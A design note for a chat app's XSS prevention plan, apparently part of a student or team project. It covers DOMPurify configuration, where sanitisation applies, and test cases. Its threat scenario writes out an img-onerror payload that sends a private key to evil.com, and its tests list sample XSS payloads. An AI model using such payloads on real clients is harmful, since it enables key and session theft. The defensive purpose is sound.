# Feature: XSS Prevention (DOMPurify)

**Owner:** Mohamed Hussain (235697)
**Priority:** Week 2 (Early — applies to all message rendering)
**Status:** Planned

---

## Overview

If a malicious user sends a message containing `<script>` tags or other HTML payloads, an unprotected app might execute them — this is Cross-Site Scripting (XSS). In an E2EE context, XSS is particularly dangerous because it can exfiltrate private keys and session state from the client.

---

## The Threat

```
Attack Scenario:
1. Attacker sends message: <img src=x onerror="fetch('https://evil.com/steal?key='+getPrivateKey())">
2. Message is E2EE encrypted, passes through server as ciphertext
3. Recipient decrypts → gets malicious HTML string
4. If rendered with innerHTML → script executes → private keys stolen
5. ALL of E2EE is now compromised for this user
```

**XSS in E2EE is a total system compromise** — the attacker can steal identity keys, session state, and message history.

---

## Implementation

### Integration Point

DOMPurify is integrated into the **message rendering pipeline**. Every decrypted message passes through sanitization before DOM insertion.

```typescript
import DOMPurify from 'dompurify';

// ALWAYS do this before rendering any message content
const safeHTML = DOMPurify.sanitize(decryptedMessageContent);
```

### Rules

1. **Never use `innerHTML` directly** — always go through DOMPurify first
2. **Sanitize after decryption, before rendering** — the decrypted plaintext is untrusted
3. **Sanitize markdown output too** — if using a markdown renderer, sanitize its HTML output
4. **Configure DOMPurify strictly** — disallow scripts, event handlers, dangerous attributes

### Recommended DOMPurify Configuration

```typescript
const PURIFY_CONFIG = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'code', 'pre', 'blockquote'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'],  // for links opening in new tab
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input'],
  FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover', 'style'],
};

const safeHTML = DOMPurify.sanitize(content, PURIFY_CONFIG);
```

---

## Where Sanitization Must Happen

| Component | Input Source | Must Sanitize? |
|-----------|------------|---------------|
| ChatWindow.tsx | Decrypted message content | YES — primary attack surface |
| Notification display | Decrypted message metadata | YES (but should be generic anyway) |
| Device names | User-provided device display name | YES |
| Room names | User-created room names | YES |
| User display names | Profile data | YES |

---

## Architectural Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| DOMPurify over manual escaping | Battle-tested library, handles edge cases | Manual escaping misses mutation XSS, attribute injection, etc. |
| Allowlist over blocklist | Only permit known-safe tags | Blocklists always miss new attack vectors |
| Sanitize at render time | Not at storage time | Raw content preserved for future re-rendering with different rules |

---

## Testing

- [ ] XSS payload `<img src=x onerror=alert(1)>` is stripped by DOMPurify
- [ ] `<script>alert('xss')</script>` is completely removed
- [ ] `<a href="javascript:alert(1)">click</a>` — javascript: protocol is stripped
- [ ] Valid formatting tags (bold, italic, links) pass through correctly
- [ ] Markdown-rendered HTML is also sanitized
- [ ] No `innerHTML` usage anywhere in message display components (code review check)
